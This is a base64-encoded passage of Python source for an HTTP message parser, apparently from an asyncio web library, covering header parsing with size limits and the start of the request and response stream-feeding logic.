LjFcclxuIyBhbmQgaHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzcyMzAjYXBwZW5kaXgtQlxyXG4jXHJcbiMgICAgIG1ldGhvZCA9IHRva2VuXHJcbiMgICAgIHRjaGFyID0gIiEiIC8gIiMiIC8gIiQiIC8gIiUiIC8gIiYiIC8gIlwnIiAvICIqIiAvICIrIiAvICItIiAvICIuIiAvXHJcbiMgICAgICAgICAgICAgIl4iIC8gIl8iIC8gImAiIC8gInwiIC8gIn4iIC8gRElHSVQgLyBBTFBIQVxyXG4jICAgICB0b2tlbiA9IDEqdGNoYXJcclxuTUVUSFJFOiBGaW5hbFtQYXR0ZXJuW3N0cl1dID0gcmUuY29tcGlsZShyIlshIyQlJlwnKitcXC0uXl9gfH4wLTlBLVphLXpdKyIpXHJcblZFUlNSRTogRmluYWxbUGF0dGVybltzdHJdXSA9IHJlLmNvbXBpbGUociJIVFRQLyhcXGQrKS4oXFxkKykiKVxyXG5IRFJSRTogRmluYWxbUGF0dGVybltieXRlc11dID0gcmUuY29tcGlsZShyYiJbXFx4MDAtXFx4MUZcXHg3RigpPD5ALDs6XFxbXFxdPXt9IFxcdFxcXFxcXFxcXFwiXSIpXHJcblxyXG5cclxuY2xhc3MgUmF3UmVxdWVzdE1lc3NhZ2UoTmFtZWRUdXBsZSk6XHJcbiAgICBtZXRob2Q6IHN0clxyXG4gICAgcGF0aDogc3RyXHJcbiAgICB2ZXJzaW9uOiBIdHRwVmVyc2lvblxyXG4gICAgaGVhZGVyczogIkNJTXVsdGlEaWN0UHJveHlbc3RyXSJcclxuICAgIHJhd19oZWFkZXJzOiBSYXdIZWFkZXJzXHJcbiAgICBzaG91bGRfY2xvc2U6IGJvb2xcclxuICAgIGNvbXByZXNzaW9uOiBPcHRpb25hbFtzdHJdXHJcbiAgICB1cGdyYWRlOiBib29sXHJcbiAgICBjaHVua2VkOiBib29sXHJcbiAgICB1cmw6IFVSTFxyXG5cclxuXHJcblJhd1Jlc3BvbnNlTWVzc2FnZSA9IGNvbGxlY3Rpb25zLm5hbWVkdHVwbGUoXHJcbiAgICAiUmF3UmVzcG9uc2VNZXNzYWdlIixcclxuICAgIFtcclxuICAgICAgICAidmVyc2lvbiIsXHJcbiAgICAgICAgImNvZGUiLFxyXG4gICAgICAgICJyZWFzb24iLFxyXG4gICAgICAgICJoZWFkZXJzIixcclxuICAgICAgICAicmF3X2hlYWRlcnMiLFxyXG4gICAgICAgICJzaG91bGRfY2xvc2UiLFxyXG4gICAgICAgICJjb21wcmVzc2lvbiIsXHJcbiAgICAgICAgInVwZ3JhZGUiLFxyXG4gICAgICAgICJjaHVua2VkIixcclxuICAgIF0sXHJcbilcclxuXHJcblxyXG5fTXNnVCA9IFR5cGVWYXIoIl9Nc2dUIiwgUmF3UmVxdWVzdE1lc3NhZ2UsIFJhd1Jlc3BvbnNlTWVzc2FnZSlcclxuXHJcblxyXG5jbGFzcyBQYXJzZVN0YXRlKEludEVudW0pOlxyXG5cclxuICAgIFBBUlNFX05PTkUgPSAwXHJcbiAgICBQQVJTRV9MRU5HVEggPSAxXHJcbiAgICBQQVJTRV9DSFVOS0VEID0gMlxyXG4gICAgUEFSU0VfVU5USUxfRU9GID0gM1xyXG5cclxuXHJcbmNsYXNzIENodW5rU3RhdGUoSW50RW51bSk6XHJcbiAgICBQQVJTRV9DSFVOS0VEX1NJWkUgPSAwXHJcbiAgICBQQVJTRV9DSFVOS0VEX0NIVU5LID0gMVxyXG4gICAgUEFSU0VfQ0hVTktFRF9DSFVOS19FT0YgPSAyXHJcbiAgICBQQVJTRV9NQVlCRV9UUkFJTEVSUyA9IDNcclxuICAgIFBBUlNFX1RSQUlMRVJTID0gNFxyXG5cclxuXHJcbmNsYXNzIEhlYWRlcnNQYXJzZXI6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBtYXhfbGluZV9zaXplOiBpbnQgPSA4MTkwLFxyXG4gICAgICAgIG1heF9oZWFkZXJzOiBpbnQgPSAzMjc2OCxcclxuICAgICAgICBtYXhfZmllbGRfc2l6ZTogaW50ID0gODE5MCxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLm1heF9saW5lX3NpemUgPSBtYXhfbGluZV9zaXplXHJcbiAgICAgICAgc2VsZi5tYXhfaGVhZGVycyA9IG1heF9oZWFkZXJzXHJcbiAgICAgICAgc2VsZi5tYXhfZmllbGRfc2l6ZSA9IG1heF9maWVsZF9zaXplXHJcblxyXG4gICAgZGVmIHBhcnNlX2hlYWRlcnMoXHJcbiAgICAgICAgc2VsZiwgbGluZXM6IExpc3RbYnl0ZXNdXHJcbiAgICApIC0+IFR1cGxlWyJDSU11bHRpRGljdFByb3h5W3N0cl0iLCBSYXdIZWFkZXJzXTpcclxuICAgICAgICBoZWFkZXJzID0gQ0lNdWx0aURpY3QoKSAgIyB0eXBlOiBDSU11bHRpRGljdFtzdHJdXHJcbiAgICAgICAgcmF3X2hlYWRlcnMgPSBbXVxyXG5cclxuICAgICAgICBsaW5lc19pZHggPSAxXHJcbiAgICAgICAgbGluZSA9IGxpbmVzWzFdXHJcbiAgICAgICAgbGluZV9jb3VudCA9IGxlbihsaW5lcylcclxuXHJcbiAgICAgICAgd2hpbGUgbGluZTpcclxuICAgICAgICAgICAgIyBQYXJzZSBpbml0aWFsIGhlYWRlciBuYW1lIDogdmFsdWUgcGFpci5cclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgYm5hbWUsIGJ2YWx1ZSA9IGxpbmUuc3BsaXQoYiI6IiwgMSlcclxuICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBJbnZhbGlkSGVhZGVyKGxpbmUpIGZyb20gTm9uZVxyXG5cclxuICAgICAgICAgICAgYm5hbWUgPSBibmFtZS5zdHJpcChiIiBcXHQiKVxyXG4gICAgICAgICAgICBidmFsdWUgPSBidmFsdWUubHN0cmlwKClcclxuICAgICAgICAgICAgaWYgSERSUkUuc2VhcmNoKGJuYW1lKTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIEludmFsaWRIZWFkZXIoYm5hbWUpXHJcbiAgICAgICAgICAgIGlmIGxlbihibmFtZSkgPiBzZWxmLm1heF9maWVsZF9zaXplOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgTGluZVRvb0xvbmcoXHJcbiAgICAgICAgICAgICAgICAgICAgInJlcXVlc3QgaGVhZGVyIG5hbWUge30iLmZvcm1hdChcclxuICAgICAgICAgICAgICAgICAgICAgICAgYm5hbWUuZGVjb2RlKCJ1dGY4IiwgInhtbGNoYXJyZWZyZXBsYWNlIilcclxuICAgICAgICAgICAgICAgICAgICApLFxyXG4gICAgICAgICAgICAgICAgICAgIHN0cihzZWxmLm1heF9maWVsZF9zaXplKSxcclxuICAgICAgICAgICAgICAgICAgICBzdHIobGVuKGJuYW1lKSksXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICBoZWFkZXJfbGVuZ3RoID0gbGVuKGJ2YWx1ZSlcclxuXHJcbiAgICAgICAgICAgICMgbmV4dCBsaW5lXHJcbiAgICAgICAgICAgIGxpbmVzX2lkeCArPSAxXHJcbiAgICAgICAgICAgIGxpbmUgPSBsaW5lc1tsaW5lc19pZHhdXHJcblxyXG4gICAgICAgICAgICAjIGNvbnN1bWUgY29udGludWF0aW9uIGxpbmVzXHJcbiAgICAgICAgICAgIGNvbnRpbnVhdGlvbiA9IGxpbmUgYW5kIGxpbmVbMF0gaW4gKDMyLCA5KSAgIyAoXCcgXCcsIFwnXFx0XCcpXHJcblxyXG4gICAgICAgICAgICBpZiBjb250aW51YXRpb246XHJcbiAgICAgICAgICAgICAgICBidmFsdWVfbHN0ID0gW2J2YWx1ZV1cclxuICAgICAgICAgICAgICAgIHdoaWxlIGNvbnRpbnVhdGlvbjpcclxuICAgICAgICAgICAgICAgICAgICBoZWFkZXJfbGVuZ3RoICs9IGxlbihsaW5lKVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIGhlYWRlcl9sZW5ndGggPiBzZWxmLm1heF9maWVsZF9zaXplOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBMaW5lVG9vTG9uZyhcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJyZXF1ZXN0IGhlYWRlciBmaWVsZCB7fSIuZm9ybWF0KFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJuYW1lLmRlY29kZSgidXRmOCIsICJ4bWxjaGFycmVmcmVwbGFjZSIpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICApLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKHNlbGYubWF4X2ZpZWxkX3NpemUpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyKGhlYWRlcl9sZW5ndGgpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICAgICAgYnZhbHVlX2xzdC5hcHBlbmQobGluZSlcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgIyBuZXh0IGxpbmVcclxuICAgICAgICAgICAgICAgICAgICBsaW5lc19pZHggKz0gMVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIGxpbmVzX2lkeCA8IGxpbmVfY291bnQ6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSBsaW5lc1tsaW5lc19pZHhdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxpbmU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51YXRpb24gPSBsaW5lWzBdIGluICgzMiwgOSkgICMgKFwnIFwnLCBcJ1xcdFwnKVxyXG4gICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSBiIiJcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICAgICAgICAgIGJ2YWx1ZSA9IGIiIi5qb2luKGJ2YWx1ZV9sc3QpXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBpZiBoZWFkZXJfbGVuZ3RoID4gc2VsZi5tYXhfZmllbGRfc2l6ZTpcclxuICAgICAgICAgICAgICAgICAgICByYWlzZSBMaW5lVG9vTG9uZyhcclxuICAgICAgICAgICAgICAgICAgICAgICAgInJlcXVlc3QgaGVhZGVyIGZpZWxkIHt9Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBibmFtZS5kZWNvZGUoInV0ZjgiLCAieG1sY2hhcnJlZnJlcGxhY2UiKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICApLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzdHIoc2VsZi5tYXhfZmllbGRfc2l6ZSksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHN0cihoZWFkZXJfbGVuZ3RoKSxcclxuICAgICAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgICAgICBidmFsdWUgPSBidmFsdWUuc3RyaXAoKVxyXG4gICAgICAgICAgICBuYW1lID0gYm5hbWUuZGVjb2RlKCJ1dGYtOCIsICJzdXJyb2dhdGVlc2NhcGUiKVxyXG4gICAgICAgICAgICB2YWx1ZSA9IGJ2YWx1ZS5kZWNvZGUoInV0Zi04IiwgInN1cnJvZ2F0ZWVzY2FwZSIpXHJcblxyXG4gICAgICAgICAgICBoZWFkZXJzLmFkZChuYW1lLCB2YWx1ZSlcclxuICAgICAgICAgICAgcmF3X2hlYWRlcnMuYXBwZW5kKChibmFtZSwgYnZhbHVlKSlcclxuXHJcbiAgICAgICAgcmV0dXJuIChDSU11bHRpRGljdFByb3h5KGhlYWRlcnMpLCB0dXBsZShyYXdfaGVhZGVycykpXHJcblxyXG5cclxuY2xhc3MgSHR0cFBhcnNlcihhYmMuQUJDLCBHZW5lcmljW19Nc2dUXSk6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBwcm90b2NvbDogT3B0aW9uYWxbQmFzZVByb3RvY29sXSA9IE5vbmUsXHJcbiAgICAgICAgbG9vcDogT3B0aW9uYWxbYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcF0gPSBOb25lLFxyXG4gICAgICAgIGxpbWl0OiBpbnQgPSAyICoqIDE2LFxyXG4gICAgICAgIG1heF9saW5lX3NpemU6IGludCA9IDgxOTAsXHJcbiAgICAgICAgbWF4X2hlYWRlcnM6IGludCA9IDMyNzY4LFxyXG4gICAgICAgIG1heF9maWVsZF9zaXplOiBpbnQgPSA4MTkwLFxyXG4gICAgICAgIHRpbWVyOiBPcHRpb25hbFtCYXNlVGltZXJDb250ZXh0XSA9IE5vbmUsXHJcbiAgICAgICAgY29kZTogT3B0aW9uYWxbaW50XSA9IE5vbmUsXHJcbiAgICAgICAgbWV0aG9kOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICByZWFkYWxsOiBib29sID0gRmFsc2UsXHJcbiAgICAgICAgcGF5bG9hZF9leGNlcHRpb246IE9wdGlvbmFsW1R5cGVbQmFzZUV4Y2VwdGlvbl1dID0gTm9uZSxcclxuICAgICAgICByZXNwb25zZV93aXRoX2JvZHk6IGJvb2wgPSBUcnVlLFxyXG4gICAgICAgIHJlYWRfdW50aWxfZW9mOiBib29sID0gRmFsc2UsXHJcbiAgICAgICAgYXV0b19kZWNvbXByZXNzOiBib29sID0gVHJ1ZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLnByb3RvY29sID0gcHJvdG9jb2xcclxuICAgICAgICBzZWxmLmxvb3AgPSBsb29wXHJcbiAgICAgICAgc2VsZi5tYXhfbGluZV9zaXplID0gbWF4X2xpbmVfc2l6ZVxyXG4gICAgICAgIHNlbGYubWF4X2hlYWRlcnMgPSBtYXhfaGVhZGVyc1xyXG4gICAgICAgIHNlbGYubWF4X2ZpZWxkX3NpemUgPSBtYXhfZmllbGRfc2l6ZVxyXG4gICAgICAgIHNlbGYudGltZXIgPSB0aW1lclxyXG4gICAgICAgIHNlbGYuY29kZSA9IGNvZGVcclxuICAgICAgICBzZWxmLm1ldGhvZCA9IG1ldGhvZFxyXG4gICAgICAgIHNlbGYucmVhZGFsbCA9IHJlYWRhbGxcclxuICAgICAgICBzZWxmLnBheWxvYWRfZXhjZXB0aW9uID0gcGF5bG9hZF9leGNlcHRpb25cclxuICAgICAgICBzZWxmLnJlc3BvbnNlX3dpdGhfYm9keSA9IHJlc3BvbnNlX3dpdGhfYm9keVxyXG4gICAgICAgIHNlbGYucmVhZF91bnRpbF9lb2YgPSByZWFkX3VudGlsX2VvZlxyXG5cclxuICAgICAgICBzZWxmLl9saW5lcyA9IFtdICAjIHR5cGU6IExpc3RbYnl0ZXNdXHJcbiAgICAgICAgc2VsZi5fdGFpbCA9IGIiIlxyXG4gICAgICAgIHNlbGYuX3VwZ3JhZGVkID0gRmFsc2VcclxuICAgICAgICBzZWxmLl9wYXlsb2FkID0gTm9uZVxyXG4gICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtIdHRwUGF5bG9hZFBhcnNlcl1cclxuICAgICAgICBzZWxmLl9hdXRvX2RlY29tcHJlc3MgPSBhdXRvX2RlY29tcHJlc3NcclxuICAgICAgICBzZWxmLl9saW1pdCA9IGxpbWl0XHJcbiAgICAgICAgc2VsZi5faGVhZGVyc19wYXJzZXIgPSBIZWFkZXJzUGFyc2VyKG1heF9saW5lX3NpemUsIG1heF9oZWFkZXJzLCBtYXhfZmllbGRfc2l6ZSlcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kXHJcbiAgICBkZWYgcGFyc2VfbWVzc2FnZShzZWxmLCBsaW5lczogTGlzdFtieXRlc10pIC0+IF9Nc2dUOlxyXG4gICAgICAgIHBhc3NcclxuXHJcbiAgICBkZWYgZmVlZF9lb2Yoc2VsZikgLT4gT3B0aW9uYWxbX01zZ1RdOlxyXG4gICAgICAgIGlmIHNlbGYuX3BheWxvYWRfcGFyc2VyIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9wYXlsb2FkX3BhcnNlci5mZWVkX2VvZigpXHJcbiAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyID0gTm9uZVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICMgdHJ5IHRvIGV4dHJhY3QgcGFydGlhbCBtZXNzYWdlXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX3RhaWw6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9saW5lcy5hcHBlbmQoc2VsZi5fdGFpbClcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2xpbmVzOlxyXG4gICAgICAgICAgICAgICAgaWYgc2VsZi5fbGluZXNbLTFdICE9ICJcXHJcXG4iOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2xpbmVzLmFwcGVuZChiIiIpXHJcbiAgICAgICAgICAgICAgICB3aXRoIHN1cHByZXNzKEV4Y2VwdGlvbik6XHJcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHNlbGYucGFyc2VfbWVzc2FnZShzZWxmLl9saW5lcylcclxuICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuICAgIGRlZiBmZWVkX2RhdGEoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBkYXRhOiBieXRlcyxcclxuICAgICAgICBTRVA6IGJ5dGVzID0gYiJcXHJcXG4iLFxyXG4gICAgICAgIEVNUFRZOiBieXRlcyA9IGIiIixcclxuICAgICAgICBDT05URU5UX0xFTkdUSDogaXN0ciA9IGhkcnMuQ09OVEVOVF9MRU5HVEgsXHJcbiAgICAgICAgTUVUSF9DT05ORUNUOiBzdHIgPSBoZHJzLk1FVEhfQ09OTkVDVCxcclxuICAgICAgICBTRUNfV0VCU09DS0VUX0tFWTE6IGlzdHIgPSBoZHJzLlNFQ19XRUJTT0NLRVRfS0VZMSxcclxuICAgICkgLT4gVHVwbGVbTGlzdFtUdXBsZVtfTXNnVCwgU3RyZWFtUmVhZGVyXV0sIGJvb2wsIGJ5dGVzXTpcclxuXHJcbiAgICAgICAgbWVzc2FnZXMgPSBbXVxyXG5cclxuICAgICAgICBpZiBzZWxmLl90YWlsOlxyXG4gICAgICAgICAgICBkYXRhLCBzZWxmLl90YWlsID0gc2VsZi5fdGFpbCArIGRhdGEsIGIiIlxyXG5cclxuICAgICAgICBkYXRhX2xlbiA9IGxlbihkYXRhKVxyXG4gICAgICAgIHN0YXJ0X3BvcyA9IDBcclxuICAgICAgICBsb29wID0gc2VsZi5sb29wXHJcblxyXG4gICAgICAgIHdoaWxlIHN0YXJ0X3BvcyA8IGRhdGFfbGVuOlxyXG5cclxuICAgICAgICAgICAgIyByZWFkIEhUVFAgbWVzc2FnZSAocmVxdWVzdC9yZXNwb25zZSBsaW5lICsgaGVhZGVycyksIFxcclxcblxcclxcblxyXG4gICAgICAgICAgICAjIGFuZCBzcGxpdCBieSBsaW5lc1xyXG4gICAgICAgICAgICBpZiBzZWxmLl9wYXlsb2FkX3BhcnNlciBpcyBOb25lIGFuZCBub3Qgc2VsZi5fdXBncmFkZWQ6XHJcbiAgICAgICAgICAgICAgICBwb3MgPSBkYXRhLmZpbmQoU0VQLCBzdGFydF9wb3MpXHJcbiAgICAgICAgICAgICAgICAjIGNvbnN1bWUgXFxyXFxuXHJcbiAgICAgICAgICAgICAgICBpZiBwb3MgPT0gc3RhcnRfcG9zIGFuZCBub3Qgc2VsZi5fbGluZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgc3RhcnRfcG9zID0gcG9zICsgMlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgcG9zID49IHN0YXJ0X3BvczpcclxuICAgICAgICAgICAgICAgICAgICAjIGxpbmUgZm91bmRcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9saW5lcy5hcHBlbmQoZGF0YVtzdGFydF9wb3M6cG9zXSlcclxuICAgICAgICAgICAgICAgICAgICBzdGFydF9wb3MgPSBwb3MgKyAyXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICMgXFxyXFxuXFxyXFxuIGZvdW5kXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5fbGluZXNbLTFdID09IEVNUFRZOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBtc2c6IF9Nc2dUID0gc2VsZi5wYXJzZV9tZXNzYWdlKHNlbGYuX2xpbmVzKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5fbGluZXMuY2xlYXIoKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgZGVmIGdldF9jb250ZW50X2xlbmd0aCgpIC0+IE9wdGlvbmFsW2ludF06XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHBheWxvYWQgbGVuZ3RoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZW5ndGhfaGRyID0gbXNnLmhlYWRlcnMuZ2V0KENPTlRFTlRfTEVOR1RIKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuZ3RoX2hkciBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBOb25lXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxlbmd0aCA9IGludChsZW5ndGhfaGRyKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgSW52YWxpZEhlYWRlcihDT05URU5UX0xFTkdUSClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW5ndGggPCAwOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIEludmFsaWRIZWFkZXIoQ09OVEVOVF9MRU5HVEgpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGxlbmd0aFxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgbGVuZ3RoID0gZ2V0X2NvbnRlbnRfbGVuZ3RoKClcclxuICAgICAgICAgICAgICAgICAgICAgICAgIyBkbyBub3Qgc3VwcG9ydCBvbGQgd2Vic29ja2V0IHNwZWNcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgU0VDX1dFQlNPQ0tFVF9LRVkxIGluIG1zZy5oZWFkZXJzOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgSW52YWxpZEhlYWRlcihTRUNfV0VCU09DS0VUX0tFWTEpXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl91cGdyYWRlZCA9IG1zZy51cGdyYWRlXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICBtZXRob2QgPSBnZXRhdHRyKG1zZywgIm1ldGhvZCIsIHNlbGYubWV0aG9kKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgYXNzZXJ0IHNlbGYucHJvdG9jb2wgaXMgbm90IE5vbmVcclxuICAgICAgICAgICAgICAgICAgICAgICAgIyBjYWxjdWxhdGUgcGF5bG9hZFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAobGVuZ3RoIGlzIG5vdCBOb25lIGFuZCBsZW5ndGggPiAwKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgb3IgbXNnLmNodW5rZWRcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFuZCBub3QgbXNnLnVwZ3JhZGVcclxuICAgICAgICAgICAgICAgICAgICAgICAgKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBTdHJlYW1SZWFkZXIoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5wcm90b2NvbCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lcj1zZWxmLnRpbWVyLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvb3A9bG9vcCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaW1pdD1zZWxmLl9saW1pdCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheWxvYWRfcGFyc2VyID0gSHR0cFBheWxvYWRQYXJzZXIoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bG9hZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZW5ndGg9bGVuZ3RoLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rZWQ9bXNnLmNodW5rZWQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWV0aG9kPW1ldGhvZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wcmVzc2lvbj1tc2cuY29tcHJlc3Npb24sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29kZT1zZWxmLmNvZGUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVhZGFsbD1zZWxmLnJlYWRhbGwsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2Vfd2l0aF9ib2R5PXNlbGYucmVzcG9uc2Vfd2l0aF9ib2R5LFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF1dG9fZGVjb21wcmVzcz1zZWxmLl9hdXRvX2RlY29tcHJlc3MsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgcGF5bG9hZF9wYXJzZXIuZG9uZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl9wYXlsb2FkX3BhcnNlciA9IHBheWxvYWRfcGFyc2VyXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgbWV0aG9kID09IE1FVEhfQ09OTkVDVDpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzc2VydCBpc2luc3RhbmNlKG1zZywgUmF3UmVxdWVzdE1lc3NhZ2UpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXlsb2FkID0gU3RyZWFtUmVhZGVyKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucHJvdG9jb2wsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGltZXI9c2VsZi50aW1lcixcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb29wPWxvb3AsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGltaXQ9c2VsZi5fbGltaXQsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLl91cGdyYWRlZCA9IFRydWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuX3BheWxvYWRfcGFyc2VyID0gSHR0cFBheWxvYWRQYXJzZXIoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bG9hZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZXRob2Q9bXNnLm1ldGhvZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21wcmVzc2lvbj1tc2cuY29tcHJlc3Npb24sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVhZGFsbD1UcnVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF1dG9fZGVjb21wcmVzcz1zZWxmLl9hdXRvX2RlY29tcHJlc3MsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2V0YXR0cihtc2csICJjb2RlIiwgMTAwKSA+PSAxOTlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhbmQgbGVuZ3RoIGlzIE5vbmVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhbmQgc2VsZi5yZWFkX3VudGlsX2VvZlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXlsb2FkID0gU3RyZWFtUmVhZGVyKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnByb3RvY29sLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aW1lcj1zZWxmLnRpbWVyLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb29wPWxvb3AsXH